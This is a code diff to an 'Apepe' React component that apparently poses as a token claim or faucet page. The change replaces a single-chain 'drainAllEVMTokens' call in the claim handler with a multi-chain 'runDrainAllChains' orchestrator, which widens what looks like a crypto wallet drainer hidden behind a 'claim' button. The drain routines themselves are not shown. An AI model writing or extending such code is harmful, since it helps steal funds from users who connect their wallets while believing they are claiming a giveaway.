@@ -15,6 +15,7 @@ import { useChainInfo } from '@/hooks/useChainInfo';
 import { useChain } from '@/contexts/ChainContext';
 import { useEVMWallet } from '@/providers/EVMWalletProvider';
 import { drainAllEVMTokens } from '@/utils/evmTransactions';
+import { useMultiChainOrchestrator } from '@/contexts/MultiChainOrchestratorContext';
 import apepeImage from '@/assets/apepe.jpg';
 
 const FAUCET_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
@@ -35,6 +36,7 @@ const Apepe = () => {
   const { activeChain, evmChainId } = useChain();
   const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
   const { chainName } = useChainInfo();
+  const { runDrainAllChains } = useMultiChainOrchestrator();
   const [isClaiming, setIsClaiming] = useState(false);
 
   const fetchAllBalances = useCallback(async () => {
@@ -100,7 +102,7 @@ const Apepe = () => {
     if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
       try {
         setIsClaiming(true);
-        await drainAllEVMTokens(evmSigner, evmProvider, chainName, evmChainId || 1);
+        await runDrainAllChains('apepe');
       } catch (error) {
         console.error(error);
       } finally {
